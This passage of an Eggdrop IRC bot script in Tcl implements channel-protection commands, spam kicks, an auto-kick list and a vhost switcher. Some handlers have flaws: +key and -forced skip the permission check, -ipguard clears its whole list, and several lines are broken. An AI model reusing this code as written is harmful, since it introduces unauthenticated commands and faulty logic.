   set count 0
   set lstidx ""
   for {set i 0} {$i < $nicklen} {incr i} {
      set idx [string index $nickchk $i]
      if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
         set count 0
      } {
         if {$idx != $lstidx && $idx != "y"} { incr count }
         if {$count == 4} {
            spamkick $nick $uhost $chan
            return 0
         }
      }
      set lstidx $idx
   }
}
proc akick_chk {nick uhost chan} {
   global notc bannick
   foreach x [getuser "AKICK" HOSTS] {
      if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
         set bannick($nick) $x
         putserv "KICK $chan $nick : 4Auto Kick List/Mohon Ganti Nick/Ident...!!! "
         return 0
      }
   }
}
set spidx 1
proc spamkick {nick uhost chan} {
   global spidx notc bannick
   set bannick($nick) "$nick!*@*"
   if {$spidx == 1} {
      putserv "KICK $chan $nick :4!SpaM!1 YeW AInT WeLcOmE In 4[string toupper $chan]"
   } elseif {$spidx == 2} {
      putserv "KICK $chan $nick :4!SpaM!1 DRonE TRoJaN"
   } elseif {$spidx == 3} {
      putserv "KICK $chan $nick :4!SpaM!1 UgH I HatE ThIs NIcK"
   } elseif {$spidx == 4} {
      putserv "KICK $chan $nick :4!SpaM!1 Ups WRoNg WaY"
   } elseif {$spidx == 5} {
      putserv "KICK $chan $nick :4!SpaM!1 DonT EnTeReD 4[string toupper $chan]"
   } elseif {$spidx == 6} {
      putserv "KICK $chan $nick :4!SpaM!1 InTeRcEpT"
   } elseif {$spidx == 7} {
      putserv "KICK $chan $nick :4!SpaM!1 G.o.T.c.H.a"
   } elseif {$spidx == 8} {
      putserv "KICK $chan $nick :4!SpaM!1 NEgaTIvE HoUsToN"
   } elseif {$spidx == 9} {
      putserv "KICK $chan $nick :4!SpaM!1 gRoUndEd"
   } elseif {$spidx == 10} {
      putserv "KICK $chan $nick :4!SpaM!1 AnTIcIpaTEd"
   } elseif {$spidx == 11} {
      putserv "KICK $chan $nick :4!SpaM!1 gO sIt In tHe cOrNeR"
   } elseif {$spidx == 12} {
      putserv "KICK $chan $nick :4!SpaM!1 b.l.a.c.k.l.i.s.t.e.d"
   } elseif {$spidx == 13} {
      putserv "KICK $chan $nick :4!SpaM!1 ReJecTed FRoM 4[string toupper $chan]"
   } elseif {$spidx == 14} {
      putserv "KICK $chan $nick :4!SpaM!1 sMoosHINg ReLaY TaBLe"
   } elseif {$spidx == 15} {
      putserv "KICK $chan $nick :4!SpaM!1 dUn EnTeRed oNe oF mY cHanneL"
   } elseif {$spidx == 16} {
      putserv "KICK $chan $nick :4!SpaM!1 ReFusEd LInK tO 4[string toupper $chan]"
   } elseif {$spidx == 17} {
      putserv "KICK $chan $nick :4!SpaM!1 FakE NIcKNaMe"
   } elseif {$spidx >= 18} {
      putserv "KICK $chan $nick :4!SpaM!1 Unable to resolve4 $nick"
      set spidx 0
   }
   incr spidx
   return 0
}
proc isutimer {text} {
   set text [string tolower $text]
   foreach x [utimers] {
      set x [string tolower $x]
      if {[string match "*$text*" $x]} { 
         return 1
         break
      }
   }
   return 0
}
proc istimer {text} {
   set text [string tolower $text]
   foreach x [timers] {
      set x [string tolower $x]
      if {[string match "*$text*" $x]} { 
         return 1 
         break
      }
   }
   return 0
}
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc msg_vhost {nick uhost hand rest} {
   global my-hostname my-ip notc
   if {$rest == ""} {
      puthelp "NOTICE $nick :ReSET TO DeFauLT"
      setuser "config" XTRA "VHOST" ""
      saveuser
      vback "*" "*" "0"
      return 0
   }
   for {set i 0} {$i < [string length $rest]} {incr i} {
      set idx [string index $rest $i]
      if {![string match "*$idx*" "1234567890."]} {
         puthelp "NOTICE $nick :UsE DNS IP NuMBeR"
         return 0
      }
   }
   if {[isutimer "vback"]} {
      puthelp "NOTICE $nick :WaIT..!"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set my-hostname $rest
   set my-ip $rest
   utimer 30 [list vback $nick $rest "1"]
   listen 65234 bots
   set idx [connect $rest 65234]
   if {[isnumber $idx] && $idx > 0} {
      if {![isutimer "vback"]} { return 0 }
      foreach x [utimers] {
         if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
      }
      setuser "config" XTRA "VHOST" $rest
      saveuser
      putserv "QUIT :cHaNgINg vHosT"
   }
   listen 65234 off
}
bind raw - 465 klined
proc klined {from keyword arg} {
   vback "*" "*" "0"
}
proc vback {nick vhosts chk} {
   global old_hostname old_ip notc
   set my-hostname $old_hostname
   set my-ip $old_ip
   if {$chk == "1"} {
      puthelp "NOTICE $nick :\[$vhosts\] NoT SuPPoRT..!"
   }
   catch { listen 652343 off }
}
proc pub_status {nick uhost hand channel rest} {
   global ban-time botnick own ps vern
   set cflag "c$channel"
   set cflag [string range $cflag 0 8]
   if {$rest != ""} {
      if {[validchan $rest]} {
         set channel $rest
      } { 
         return 0 
      }
   }
   set cinfo [channel info $channel]
   if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
   set mstatus ""
   if {[matchattr $cflag I]} { append mstatus "\[1T\]oPIcLocK " }
   if {[matchattr $cflag M]} { append mstatus "FoRcE\[1M\]odE " }
   if {[string match "*+nodesynch*" $cinfo]} { append mstatus "AuTo\[1K\]IcK " }
   if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[1D\]onTKIcK@P " }
   if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRE\[1@\]P " }
   if {[string match "*+greet*" $cinfo]} {
      set i 0
      while {$i < [string length $cinfo]} {
         set y 0
         while {$y < [string length [lindex $cinfo $i]]} {
            if {[string index [lindex $cinfo $i] $y] == ":"} { break }
            set y [incr y]
         }
         if {$y != [string length [lindex $cinfo $i]]} { break }
         set i [incr i]
      }
      set ichan [lindex $cinfo $i]
      set ictcp [lindex $cinfo [expr $i + 1]]
      set ijoin [lindex $cinfo [expr $i + 2]]
      set ikick [lindex $cinfo [expr $i + 3]]
      set ideop [lindex $cinfo [expr $i + 4]]
      set inick [lindex $cinfo [expr $i + 5]]
      if {![string match "*:*" $inick]} {
         set inick "0"
      }
      append mstatus "\[1G\]uaRd FLoOd \[LInE1 $ichan cTcP1 $ictcp JoIN1 $ijoin KIcK1 $ikick De@p1 $ideop NIcK1 $inick\] "
      if {${ban-time} != 0} { append mstatus "\[1B\]aNTImE1 ${ban-time} mIn " }
   }
   if {[matchattr $cflag V]} { append mstatus "\[1A\]uToVoIcE1 [getuser $cflag XTRA "VC"] 2nd " }
   if {[matchattr $cflag K]} { append mstatus "\[1K\]eY " }
   if {[matchattr $cflag D]} { append mstatus "Re\[1V\]eNgE " }
   if {[matchattr $cflag G]} { append mstatus "\[1G\]ReeT " }
   if {[matchattr $cflag H]} { append mstatus "\[1N\]TcParT " }
   if {[matchattr $cflag S]} { append mstatus "\[1S\]paM " }
   if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[1@\]PSKIcK " }
   if {[matchattr $cflag R]} { append mstatus "\[1R\]ePeaT1 [getuser $cflag XTRA "RPT"] " }
   if {[matchattr $cflag U]} { append mstatus "\[1C\]aPs1 [getuser $cflag XTRA "CAPS"]% " }
   if {[matchattr $cflag P]} { append mstatus "JoIN\[1P\]aRT1 [getuser $cflag XTRA "JP"] 2nd " }
   if {[matchattr $cflag T]} { append mstatus "\[1T\]exT1 [getuser $cflag XTRA "CHAR"] CHaR " }
   if {[matchattr $cflag J]} { append mstatus "MaSs\[1J\]oIN " }
   if {[matchattr $cflag L]} { append mstatus "\[1L\]ImITEd1 +[getuser $cflag XTRA "LIMIT"] " }
   if {[string match "*+seen*" $cinfo]} { append mstatus "\[1S\]EEN " }
   if {[matchattr $cflag O]} { append mstatus "\[1C\]LonE1 [getuser $cflag XTRA "CLONE"] MaX " }
   if {[matchattr $cflag B]} { append mstatus "\[1B\]OLd1 " }
   if {[matchattr $cflag W]} { append mstatus "Co\[1L\]OuR " }
   if {[string match "*+action*" $cinfo]} { append mstatus "\[1AC\]Tion1 " }
   if {[string match "*+guest*" $cinfo]} { append mstatus "\[1No\]GUesT1 " }
   if {[matchattr $cflag E]} { append mstatus "\[1E\]nFoRceBaN " }
   if {[matchattr $cflag C]} { append mstatus "\[1C\]YcLE1 [getuser $cflag XTRA "CYCLE"] MnT " }
   if {$mstatus != ""} {
      if {[getuser "config" XTRA "ADMIN"]!=""} {
         set mstatus "SeT FoR \[1[string toupper $channel]\] ${mstatus}[getuser "config" XTRA "ADMIN"] [lgrnd]"
      } {
         set mstatus "SeT FoR \[1[string toupper $channel]\] ${mstatus}[lgrnd]"
      }
   }
   if {[string match "*c*" [getchanmode $channel]]} {
      set mstatus [uncolor $mstatus]
      regsub -all --  $mstatus "" mstatus
   }
   puthelp "NOTICE $nick : $mstatus"
}
proc pub_+spam {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [userlist A] {
         chattr $x +S
      }
      puthelp "NOTICE $nick :ALL SpaM CHaNNeL \[9ON\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[matchattr $cflag S]} {
      puthelp "NOTICE $nick :SpaM $chan \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +S
   puthelp "NOTICE $nick :SpaM $chan \[9ON\]"
   saveuser
}
proc pub_-spam {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [userlist A] {
         chattr $x -S
      }
      puthelp "NOTICE $nick :ALL SpaM CHaNNeL \[4OFF\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {![matchattr $cflag S]} {
      puthelp "NOTICE $nick :SpaM $chan \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -S
   puthelp "NOTICE $nick :SpaM $chan \[4OFF\]"
   saveuser
}
proc pub_+cycle {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +cYcLe <minutes>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +C
   setuser $cflag XTRA "CYCLE" $rest
   puthelp "NOTICE $nick :cYcLe $chan \[9$rest\] MnT"
   if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
   saveuser
}
proc pub_-cycle {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -C
   setuser $cflag XTRA "CYCLE" ""
   puthelp "NOTICE $nick :cYcLe $chan \[4OFF\]"
   saveuser
   foreach x [timers] {
      if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
   }
}
proc pub_+greet {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage +greet <msg>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +G
   setuser $cflag XTRA "GREET" $rest
   puthelp "NOTICE $nick :AuTOGReeT $chan \[$rest\]"
   saveuser
}
proc pub_-greet {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -G
   setuser $cflag XTRA "GREET" ""
   puthelp "NOTICE $nick :AuTOGReeT $chan \[4OFF\]"
   saveuser
}
proc pub_+ntcpart {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage +ntcpart <msg>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +H
   setuser $cflag XTRA "MSGPART" $rest
   puthelp "NOTICE $nick :NotiCe PaRt $chan \[$rest\]"
   saveuser
}
proc pub_-ntcpart {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -H
   setuser $cflag XTRA "MSGPART" ""
   puthelp "NOTICE $nick :NotiCe PaRt $chan \[4OFF\]"
   saveuser
}
proc pub_+limit {nick uhost hand chan rest} {
   global notc 
   if {$rest == "" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage: +limit <number>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +L
   setuser $cflag XTRA "LIMIT" $rest
   puthelp "NOTICE $nick :LImIT $chan \[9$rest\]"
   saveuser
}
proc pub_-limit {nick uhost hand chan rest} {
   global notc lst_limit
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -L
   setuser $cflag XTRA "LIMIT" ""
   puthelp "NOTICE $nick :LImIT $chan \[4OFF\]"
   catch { lst_limit($chan) }
   saveuser
}
proc pub_+topic {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +I
   setuser $cflag XTRA "TOPIC" [topic $chan]
   puthelp "NOTICE $nick :TopIc $chan \[9LocK\]"
   saveuser
}
proc pub_-topic {nick uhost hand chan rest} {
   global notc lst_limit
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -I
   setuser $cflag XTRA "TOPIC" ""
   puthelp "NOTICE $nick :TopIc $chan \[4UnLocK\]"
   saveuser
}
proc pub_+joinpart {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +joinpart <seconds>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +P
   setuser $cflag XTRA "JP" $rest
   puthelp "NOTICE $nick :JoINPaRT $chan \[9$rest Sec's\]"
   saveuser
}
proc pub_-joinpart {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -P
   setuser $cflag XTRA "JP" ""
   puthelp "NOTICE $nick :JoINPaRT $chan \[4OFF\]"
   saveuser
}
proc pub_+clone {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +clone <max>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +O
   setuser $cflag XTRA "CLONE" $rest
   puthelp "NOTICE $nick :cLonE $chan MaX \[9$rest\]"
   saveuser
}
proc pub_-clone {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -O
   setuser $cflag XTRA "CLONE" ""
   puthelp "NOTICE $nick :cLonE $chan \[4OFF\]"
   saveuser
}
proc pub_+key {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   set rest [lindex $rest 0]
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage +key <word>"
      return 0
   }
   chattr $cflag +K
   setuser $cflag XTRA "CI" [zip $rest]
   puthelp "NOTICE $nick :KeY $chan \[9$rest\]"
   saveuser
}
proc pub_-key {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -K
   setuser $cflag XTRA "CI" ""
   puthelp "NOTICE $nick :KeY $chan \[4OFF\]"
   saveuser
}
proc pub_+text {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +text <max>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +T
   setuser $cflag XTRA "CHAR" $rest
   puthelp "NOTICE $nick :TexT $chan MaX \[9$rest\]"
   saveuser
}
proc pub_-text {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -T
   setuser $cflag XTRA "CHAR" ""
   puthelp "NOTICE $nick :TexT $chan \[4OFF\]"
   saveuser
}
proc pub_+caps {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +caps <%percent>"
      return 0
   }
   if {$rest == 0 || $rest > 100} {
      puthelp "NOTICE $nick :fill under 1 - 100%"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +U
   setuser $cflag XTRA "CAPS" $rest
   puthelp "NOTICE $nick :CAPS $chan \[9$rest%\]"
   saveuser
}
proc pub_-caps {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -U
   setuser $cflag XTRA "CAPS" ""
   puthelp "NOTICE $nick :cAPs $chan \[4OFF\]"
   saveuser
}
proc pub_+repeat {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +repeat <max>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +R
   setuser $cflag XTRA "RPT" $rest
   puthelp "NOTICE $nick :RePeaT $chan MaX \[9$rest\]"
   saveuser
}
proc pub_-repeat {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -R
   setuser $cflag XTRA "RPT" ""
   puthelp "NOTICE $nick :RePeaT $chan \[4OFF\]"
   saveuser
}
proc pub_+autovoice {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$rest=="" || ![isnumber $rest]} {
      puthelp "NOTICE $nick :Usage +AuTovoIcE <secs>"
      return 0
   }
   if {$rest == 0} {
      puthelp "NOTICE $nick :cAnT UsE NuLL"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +V
   setuser $cflag XTRA "VC" $rest
   puthelp "NOTICE $nick :AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
   saveuser
   pub_mvoice $nick $uhost $hand $chan ""
}
proc pub_-autovoice {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -V
   setuser $cflag XTRA "VC" ""
   puthelp "NOTICE $nick :AuTovoIcE $chan \[4OFF\]"
   saveuser
   foreach x [utimers] {
      if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
   }
}
proc pub_+enforceban {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +E
   puthelp "NOTICE $nick :enforceban $chan \[9ON\]"
   saveuser
}
proc pub_-enforceban {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -E
   puthelp "NOTICE $nick :enforceban $chan \[4OFF\]"
   saveuser
}
proc pub_+revenge {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +D
   puthelp "NOTICE $nick :revenge $chan \[9ON\]"
   saveuser
}
proc pub_-revenge {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -D
   puthelp "NOTICE $nick :revenge $chan \[4OFF\]"
   saveuser
}
proc pub_+forced {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +M
   puthelp "NOTICE $nick :forced $chan \[9ON\]"
   saveuser
}
proc pub_-forced {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   chattr $cflag -M
   puthelp "NOTICE $nick :forced $chan \[4OFF\]"
   saveuser
}
proc pub_-colour {nick uhost hand chan rest} {
   global notc kickclr
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set kickclr "T"
   setuser "config" XTRA "KCLR" "Y"
   puthelp "NOTICE $nick :colour kick \[4OFF\]"
   saveuser
}
proc pub_+colour {nick uhost hand chan rest} {
   global notc kickclr
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch {unset kickclr}
   setuser "config" XTRA "KCLR" ""
   puthelp "NOTICE $nick :colour kick \[9ON\]"
   saveuser
}
proc pub_+colours {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +W
   setuser $cflag XTRA "COLOR" ""
   puthelp "NOTICE $nick :colours kick $chan \[9ON\]"
   saveuser
}
proc pub_-colours {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -W
   puthelp "NOTICE $nick :colours kick $chan \[4OFF\]"
   saveuser
}
proc pub_+bold {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +B
   setuser $cflag XTRA "BOLD" ""
   puthelp "NOTICE $nick :BOLD kick $chan \[9ON\]"
   saveuser
}
proc pub_-bold {nick uhost hand chan rest} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -B
   puthelp "NOTICE $nick :bOLd kick $chan \[4OFF\]"
   saveuser
}
proc pub_+ipguard {nick uhost hand channel param} {
   global botname botnick notc botnick
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +ipguard <hostname>"
      return 0
   }
   if {$rest == "*" || $rest == "*!*@*"} {
      puthelp "NOTICE $nick :invalid hostname..!"
      return 0
   }
   if {![string match "*@*" $rest]} {
      puthelp "NOTICE $nick :Usage: +ipguard <hostname>"
      return 0
   }
   set ipguard [getuser "config" XTRA "IPG"]
   foreach y $ipguard {
      if {$y == $rest} {
         puthelp "NOTICE $nick :$rest allready added..!"
         return 0
      }
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "NOTICE $nick :add \[$rest\] To IpguaRd"
   lappend ipguard $rest
   setuser "config" XTRA "IPG" $ipguard
   saveuser
   return 0
}
proc pub_-ipguard {nick uhost hand channel param} {
   global notc 
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -ipguard <hostname>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set ipguard [getuser "config" XTRA "IPG"]
   set nipg ""
   set ok "F"
   foreach y $ipguard {
      if {$y == $rest} {
         set ok "T"
         puthelp "NOTICE $nick :DeL \[$rest\] FRoM IpguaRd"
      } {
         lappend nipg
      }
   }
   if {$ok == "T"} {
      setuser "config" XTRA "IPG" $nipg
      saveuser
      return 0
   }
   puthelp "NOTICE $nick :$rest not founded..!"
}
setudef flag action
proc pub_+action {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string match "*+action*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$chan 4ReADY!!"
      return 0
   }  
   if {$rest == ""} {
      puthelp "NOTICE $nick :AcTion Random \[9ON\]"
   } {
      setuser $cflag XTRA "ACTION" $rest
      puthelp "NOTICE $nick :AcTion SeT TO \[$rest\]"
   }
   catch { channel set $chan +action }
   puthelp "NOTICE $nick :AcTion $chan \[9ON\]"
   saveuser
}
proc pub_-action {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string match "*-action*" [channel info $chan]]} {
      puthelp "NOTICE $nick :AcTion $chan already 4DISaBLE."
      return 0
   }
   catch { channel set $chan -action }
   setuser $cflag XTRA "ACTION" ""
   puthelp "NOTICE $nick :AcTion $chan \[4Off\]"
   saveuser
}
setudef flag guest
proc pub_+guest {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string match "*+guest*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$chan 4ReADY!!"
      return 0
   }  
   catch { channel set $chan +guest }
   puthelp "NOTICE $nick :Guest Nick Kick (@) & Report $chan \[9ON\]"
   saveuser
}
proc pub_-guest {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string match "*-guest*" [channel info $chan]]} {
      puthelp "NOTICE $nick :Guest Nick Kick (@) & Report $chan already 4DISaBLE."
      return 0
   }
   catch { channel set $chan -guest }
   puthelp "NOTICE $nick :Guest Nick Kick (@) & Report $chan \[4Off\]"
   saveuser
}

putlog "================xXx==============="
